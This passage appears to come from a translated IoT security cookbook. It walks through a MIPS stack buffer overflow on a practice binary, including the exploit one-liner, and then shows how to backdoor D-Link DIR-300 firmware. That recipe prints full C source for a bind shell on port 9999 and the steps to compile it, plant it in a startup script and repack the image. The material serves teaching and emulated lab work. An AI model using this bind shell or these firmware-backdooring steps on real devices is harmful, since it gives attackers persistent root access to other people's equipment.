1.  一旦您设置了`target`，您可以按`c`，这将使程序继续执行，直到完成或遇到断点或异常为止。如下面的屏幕截图所示，程序遇到了`SIGSEGV`错误：

![](img/bf792834-36fc-4443-bfa6-41eadb08f11c.png)

GEF 还显示了在捕获异常时堆栈和寄存器的整个状态。在我们的情况下，我们可以看到 RA 被`0x63616162`覆盖，这只是`baac`的十六进制表示。

现在我们有了上述信息，让我们使用模式搜索功能来找到覆盖 RA 的字节的偏移量。有了这个，我们将能够找出我们应该放置恶意地址的位置，并控制程序的执行流程。

1.  为了做到这一点，我们可以使用命令`pattern search RA-overflown-bytes-in-hex`，如下面的屏幕截图所示：

![](img/bfe00194-7601-4719-bc22-633919744bf2.png)

从前面的屏幕截图中可以看到，我们能够找到溢出寄存器 RA 的字符的偏移量，在这种情况下是`204`。这意味着我们需要`204`字节的垃圾来填满 RA 之前的所有内容，接下来的`4`字节将是用来覆盖 RA 的值。

1.  如果您还记得我们这次练习的目标是修改程序执行流程并调用`dat_shell`函数，而这个函数在程序的正常流程中不会被调用。为了找到`dat_shell`的地址，我们可以打印`dat_shell`，或者我们可以反汇编并查看起始地址。这可以通过使用`disass function-name`命令来完成，如下面的屏幕截图所示：

![](img/28dcea40-224e-48d7-b1e2-80f606697a73.png)

从前面的屏幕截图中可以看到，`dat_shell`函数从`0x00400950`地址开始。然而，前三条指令使用了**全局指针**（**GP**），这不是我们此刻想要处理的。这就是为什么我们会跳转到`0x0040095c`而不是`0x00400950`的原因。

1.  因此，让我们继续运行带有`204`个字符的垃圾，后跟地址`0x0040095c`的二进制文件。这次，我们还删除了`-g`标志，并直接运行如下：

```
sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 "$(python -c "print 'A'*204 +  '\x5c\x09\x40'")"  
```

![](img/ac22f79f-9b17-4b15-a3b3-d300b6c56a43.png)

从前面的屏幕截图中可以看到，二进制文件现在已经按我们的要求执行了`dat_shell`函数。这就是我们在基于 MIPS 的平台上执行基于堆栈的缓冲区溢出的方法。

# 它是如何工作的...

缓冲区溢出的整个基本概念是能够在缓冲区中放入比预期输入更多的字符，并以这种方式控制可能存在于堆栈上的寄存器。这也可以用于跳转到 shellcode 的位置或系统的`libc`库，并执行额外的有效载荷。

# 还有更多...

尽管我们可以在这个有漏洞的二进制文件中执行利用，但在现实世界的情况下，您可能会遇到更复杂的情况。其中之一是有趣的函数不会位于二进制文件内，您将不得不跳转到系统以执行`bin/sh`，或者创建一个 ROP 链来执行您的 shellcode。

# 使用固件修改工具（FMK）来设置后门

在利用过程中经常有用的技术之一是修改固件的能力。这可以通过从固件中提取文件系统，修改内容，然后将其重新打包成新的固件来实现。然后可以将这个新的固件刷入设备。

# 准备工作

为了修改固件，我们将使用一个名为 FMK 的工具，由*Jeremy Collake*和*Craig Heffner*编写。 FMK 利用 Binwalk 和其他工具从固件中提取文件系统，并为我们提供重新打包修改后的文件系统到新固件二进制文件的能力。

FMK 可以从[`github.com/brianpow/firmware-mod-kit/`](https://github.com/brianpow/firmware-mod-kit/)下载，或者如果您之前克隆了 FAT 工具，它可能已经存在于您的系统中。下载完成后，我们需要固件来进行尝试。为了简化事情，以便阅读本书的每个人都可以在不购买硬件的情况下复制以下步骤，我们将使用可以在 FAT 中很好地模拟的固件。

# 如何做...

以下是步骤：

1.  在这种情况下，我们将使用 D-Link 的 DIR-300 路由器的固件。为了从固件中提取文件系统，我们将使用 FMK 目录中的`extract-firmware.sh`脚本，而不是使用 Binwalk，如下所示：

```
./extract-firmware.sh Dlink_firmware.bin  
```

![](img/8ce54461-9a12-4f50-81c5-5b12f5bddde9.png)

一旦我们提取了固件，它将为我们包含一个新目录，其中包括`rootfs`、`image_parts`和`logs`文件夹。对于大多数后门和固件修改目的，我们只关心`rootfs`文件夹。

`rootfs`文件夹包含固件的整个文件系统。我们所需要做的就是为固件的架构创建一个后门，然后找到一种在固件启动时自动调用它的方法。

1.  让我们首先找出固件是为哪种架构而设计的。我们可以通过对任何固件二进制文件（如 BusyBox）进行`readelf`来找出这一点，如下截图所示：

![](img/0cecc090-c60e-40b6-bb9e-82196ef4834e.png)

1.  正如我们从前面的截图中看到的，它是基于 MIPS Little Endian 架构。这意味着我们需要为 MIPS Little Endian 格式创建和编译一个后门。以下是我们将要使用的后门，最初由*Osanda Malith*编写：

```
#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 

#define SERVER_PORT  9999 
 /* CC-BY: Osanda Malith Jayathissa (@OsandaMalith) 
  * Bind Shell using Fork for my TP-Link mr3020 router running busybox 
  * Arch : MIPS 
  * mips-linux-gnu-gcc mybindshell.c -o mybindshell -static -EB -march=24kc 
  */ 
int main() { 
   int serverfd, clientfd, server_pid, i = 0; 
   char *banner = "[~] Welcome to @OsandaMalith's Bind Shell\n"; 
   char *args[] = { "/bin/busybox", "sh", (char *) 0 }; 
   struct sockaddr_in server, client; 
   socklen_t len; 

   server.sin_family = AF_INET; 
   server.sin_port = htons(SERVER_PORT); 
   server.sin_addr.s_addr = INADDR_ANY; 

   serverfd = socket(AF_INET, SOCK_STREAM, 0); 
   bind(serverfd, (struct sockaddr *)&server, sizeof(server)); 
   listen(serverfd, 1); 

    while (1) { 
         len = sizeof(struct sockaddr); 
         clientfd = accept(serverfd, (struct sockaddr *)&client, &len); 
        server_pid = fork(); 
        if (server_pid) { 
         write(clientfd, banner,  strlen(banner)); 
           for(; i <3 /*u*/; i++) dup2(clientfd, i); 
           execve("/bin/busybox", args, (char *) 0); 
           close(clientfd); 
         } close(clientfd); 
    } return 0; 
} 
```

一旦我们有了代码，我们就可以使用 Buildroot for MIPSEL，并使用使用 Buildroot 构建的交叉编译器进行编译。我们不会详细介绍设置 Buildroot 的过程，因为这个过程非常简单，并且已经在文档中有所记录。

1.  一旦我们为 MIPSEL 创建了交叉编译器，我们就可以将`bindshell.c`编译为`bindshell`二进制文件，然后将其放置在固件的提取文件系统中：

```
./mipsel-buildroot-linux-uclibc-gcc bindshell.c -static -o bindshell  
```

下一步是寻找我们可以将这个二进制文件放置在文件系统中的位置，以及如何在启动时自动启动。这可以通过查看其中一个在启动时会自动调用的脚本来完成。

1.  查看文件系统后，我们可以将二进制文件添加到`etc/templates/`中，并可以从位于`/etc/scripts/`的名为`system.sh`的脚本中引用它，如下截图所示：

![](img/8e331f34-ed6f-4667-b80c-5c87907c098f.png)

1.  现在，让我们继续根据这个修改构建新的固件，使用`build-firmware.sh`脚本，如下截图所示：

![](img/c913fb64-af2c-4e09-8fb2-c8e2d654b37e.png)

一旦完成构建过程，它将创建新的固件，并将其放置在`firmware-name/`位置，命名为`new-firmware.bin`。

1.  一旦我们有了新的固件映像，我们就可以将这个固件复制到我们的 FAT 目录中，并进行仿真以验证我们添加的后门是否有效。这可以通过与我们之前用于仿真的相同步骤来完成。这也显示在以下截图中：

![](img/aac333e5-dc78-4677-adf0-ed215872c634.png)

正如我们从前面的截图中看到的，它给了我们一个 IP 地址`192.168.0.1`，我们现在可以尝试访问。但更有趣的是，让我们看看我们放置在固件中的后门 bindshell 是否激活。

1.  让我们尝试在前面的 IP 上运行一个连接到端口`9999`的 Netcat，并看看它是否有效：

![](img/3cea80f6-a14b-4bd8-b90e-c556ff4847ac.png)

现在，由于我们修改并放置在固件中的后门，我们在设备上有了完整的 root shell。从这里，我们可以修改其他设备配置，或者简单地使用它来远程访问运行我们修改后的恶意固件的任何设备。

# 它是如何工作的...

修改固件的能力对攻击者来说是非常强大和有用的。这使得攻击者能够绕过保护机制，移除安全功能等。由于诸如 FMK 之类的工具，攻击者可以非常容易地向任何物联网设备固件中添加自己的恶意软件或后门，然后用户可以在世界任何地方使用它。

这也是固件签名和校验和验证非常重要的原因之一，以防止因恶意或修改的固件而引起的攻击。
